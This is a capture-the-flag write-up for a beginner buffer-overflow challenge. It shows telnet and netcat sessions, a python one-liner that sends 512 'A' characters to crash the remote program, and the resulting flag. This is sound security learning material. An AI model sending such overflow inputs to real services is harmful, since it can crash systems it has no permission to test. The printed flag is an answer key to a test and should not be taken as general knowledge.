# STOP GAN (bof)
## Description
Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.

## Solution
The challenge contains
1. A server `buffer-overflow.ctfcompetition.com 1337`
2. An attachment `4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a`

We can start with the server. A domain + port could mean anything, ssh, telnet. Let's try telnet first since we don't have a user for ssh.
```bash session
$ telnet buffer-overflow.ctfcompetition.com 1337
Trying 34.77.235.48...
Connected to buffer-overflow.ctfcompetition.com.
Escape character is '^]'.
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands: 
run
quit
>>run
Inputs: run
Unable to determine action from your input
Connection closed by foreign host.
# the remote may be expecting '\n' instead of '\r\n' as sent by telnet
# https://unix.stackexchange.com/questions/331109/any-way-to-send-just-n-in-telnet
# inspecting console.c from the attachment confirms this

# try netcat instead
$ nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands: 
run
quit
>>run
Inputs: run
test
Cauliflower systems never crash >>

Console commands: 
run
quit
>>^C

# pass in large input
$ python -c 'print "run\n" + "A"*512' | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands: 
run
quit
>>Inputs: run
CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands: 
run
quit
```

### Flag
`CTF{Why_does_cauliflower_threaten_us}`

This leads to the `easiest` ending

## Bonus
TODO: Control crash